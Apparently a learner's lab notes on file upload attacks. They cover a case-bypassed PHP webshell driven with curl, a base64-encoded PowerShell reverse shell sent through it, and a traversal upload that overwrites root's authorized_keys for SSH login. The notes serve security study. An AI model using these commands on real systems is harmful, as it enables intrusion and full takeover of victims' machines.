# Using Executable Files

3 main types. First is uploading uploading a malicious script so it is executed on the web app. Second is combining it with another vulnerability like directory traversal to execute the file. Third is dependent on user interaction like uploading a .docx file with malicious macros.

If filtered, can change the file uploaded a little like `simple-backdoor.pHP`. We can check it works by using curl and `curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir`. Since we know, it is a Windows machine, we can use powershell to generate a remote shell. This is the [[https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3|one liner]]. After saving the command by doing `$Text = "[insert one liner here]"`, we can do:

```
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...

PS> exit
```

Then we do the curl command but replace the command with `curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA`

*Don't forget to start a listener and edit the powershell one-liner with the proper IP and port number.*

# Using Non-Executable Files

Upload file but can't be exploited. We will use Burp to exploit in cases like this.

![[Pasted image 20250703172246.png]]
*We send the POST request to upload the file to the repeater then upload but with relative file path.*

We can do this and even overwrite certain files:
1. `ssh-keygen`
2. `cat fileup.pub (or wtv you name your pub key) > authorized_keys`
3. We upload this file using burp but to `../../../../../../../root/.ssh/authorized_keys`
4. `ssh -i fileup -p 2222 root@domainname.com`
